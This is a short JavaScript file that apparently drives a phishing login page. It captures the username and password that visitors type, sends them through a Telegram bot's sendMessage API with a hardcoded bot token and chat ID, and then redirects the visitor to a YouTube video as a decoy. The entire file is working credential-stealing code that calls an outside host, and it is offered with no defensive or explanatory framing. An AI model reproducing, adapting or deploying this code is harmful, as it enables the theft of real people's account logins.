const sendatatme = document.getElementById("sendatatme");
const first = document.getElementById("first");
const second = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");

first.addEventListener("change", () => {
  resfirst.value = first.value;
});
second.addEventListener("change", () => {
  resecond.value = second.value;
});

function redirect() {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot5614657667:AAGvTtXUi07JHKAGKf_5uBoWHx4tGaUYiUs/sendMessage?chat_id=1360207733&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

window.location.href = 'https://youtu.be/QUEEd_L2BcI';
}

sendatatme.addEventListener("click", redirect);
